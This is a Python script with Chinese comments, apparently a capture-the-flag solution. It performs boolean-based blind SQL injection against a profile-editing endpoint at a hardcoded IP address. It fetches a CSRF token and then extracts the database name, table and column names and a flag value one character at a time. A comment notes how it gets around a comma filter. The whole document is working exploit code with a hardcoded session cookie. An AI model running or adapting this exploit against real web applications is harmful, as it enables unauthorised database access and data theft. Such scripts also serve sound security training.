# by Epicccal
import requests
import re

url = "http://111.198.29.45:47709/edit_profile"
cookie= { "session":"b7ac39ee-d4f3-4780-90c9-c993cfc01da4" }
regexp = r'value="(.*)"'    # 正则表达式 , 用于捕获所有 value 字段的值

# 获取 csrf_token
def get_csrf_token():
    # 发送 GET 请求
    response = requests.get(url,cookies=cookie)
    # 获取 HTTP 响应数据包
    res = response.text
    # 进行正则匹配 , 发现返回列表中第一个 value 键值对就是 csrf_token 的值 , 获取它
    csrf_token = re.findall(regexp, res)[0]
    #print(csrf_token)
    return csrf_token

# 发送修改 profile 的 post 数据包
def post_profile():
    result = ""
    # 调用 get_csrf_token 函数 , 得到 csrf_token 数据包
    csrf_token = get_csrf_token()
    # 循环发送数据包
    # 构造 post 数据部
    # 猜测版本信息最长10位
    for i in range(1,43):
        # 猜测版本信息由可显字符组成( 31 < ASCII < 127 )
        for j in range(32,127):
            #具体的 Payload , 用户可自行选择
            # 1. 爆出当前数据库( flask ) 
            #datas = {"csrf_token":csrf_token,"username":"a","note":"1' and (select 1=(ascii(substring((select database()) from " + str(i) + "))=" + str(j) + ")) and '1'='1","submit":"submit"}
            # 2. 爆出含有 flag 的表( flag )
            #datas = {"csrf_token":csrf_token,"username":"a","note":"1' and (select 1=(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema = 'flask') from " + str(i) + "))=" + str(j) + ")) and '1'='1","submit":"submit"}
            # 3. 爆出含有 flag 表中的字段 ( flag )
            #datas = {"csrf_token":csrf_token,"username":"a","note":"1' and (select 1=(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema = 'flask' and table_name = 'flag') from " + str(i) + "))=" + str(j) + ")) and '1'='1","submit":"submit"}
            # 4. 爆出 flag 值 ( flag ) , 建议将 i 的范围修改为 range(1,43)
            # 正则过滤了逗号 , 我们可以使用 substring(a from b) 这种格式取代 mid() 函数 , 从而绕过限制 .
            datas = {"csrf_token":csrf_token,"username":"a","note":"1' and (select 1=(ascii(substring((select flag from flag) from " + str(i) + "))=" + str(j) + ")) and '1'='1","submit":"submit"}
            response = requests.post(url,data=datas,cookies=cookie,timeout=3)
            res = response.text
            # 进行正则匹配 , 如果这里 select 1=payload 返回 1 时 , 返回数据包中的 note 字段就会显示为 1 , 反之为 0
            # 经过正则匹配 , 发现返回列表中第三个 value 键值对就是 note 的值 , 获取它
            test = re.findall(regexp, res)[2]
            #如果发现匹配的内容 , 则返回该ASCII编码对应的字符 , 并且跳出本次循环
            #print(test)
            if(test == str(1)):
                result += chr(j)
                print(result)
                break
            
if __name__ == '__main__':
    post_profile()
